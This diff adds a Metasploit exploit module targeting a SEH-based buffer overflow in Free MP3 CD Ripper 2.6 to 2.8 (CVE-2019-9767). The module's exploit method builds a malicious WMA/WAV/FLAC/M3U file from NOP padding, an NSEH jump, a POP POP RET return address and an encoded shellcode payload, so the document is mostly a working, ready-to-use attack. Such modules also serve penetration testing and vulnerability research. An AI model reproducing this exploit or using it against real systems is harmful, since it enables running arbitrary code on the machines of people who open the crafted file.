@@ -1,0 +1,66 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::FILEFORMAT
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Free MP3 CD Ripper 2.6 < 2.8 (.wma.wav.flac.m3u.acc) Buffer Overflow",
+      'Description'    => %q{
+       This module exploits a buffer overflow in Free MP3 CD Ripper versions 2.6 and 2.8.
+       By constructing a specially crafted WMA WAV M3U ACC FLAC file and attempting to convert it to an MP3 file in the
+       application, a buffer is overwritten, which allows for running shellcode.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Gionathan Reale', # Exploit-DB POC
+          'ZwX'              # Metasploit Module
+        ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-9767' ],
+          [ 'EDB', '45412' ],
+          [ 'URL', 'https://www.exploit-db.com/exploits/45412' ]
+        ],
+      'Platform'       => 'win',
+      'Targets'        =>
+        [
+          [
+            'Windows 7 x86 - Windows 7 x64',
+            {
+              'Ret' => 0x66e42121 # POP POP RET
+            }
+          ]
+        ],
+      'Payload'        =>
+        {
+          'BadChars' => "\x00\x0a\x0d\x2f"
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "Sep 09 2018",
+      'DefaultTarget'  => 0))
+
+    register_options(
+    [
+      OptString.new('FILENAME', [true, 'Create malicious file example extension (.wma .wav .acc .flac .m3u)', 'name.wma'])
+    ])
+  end
+
+  def exploit
+    file_payload = payload.encoded
+
+    msfsploit = make_fast_nops(4116)
+    msfsploit << "\xeb\x06#{Rex::Text.rand_text_alpha(2, payload_badchars)}" # NSEH_JMP
+    msfsploit << [target.ret].pack("V*")  # SEH
+    msfsploit << file_payload
+    msfsploit << make_fast_nops(4440)
+
+    file_create(msfsploit)
+  end
+end
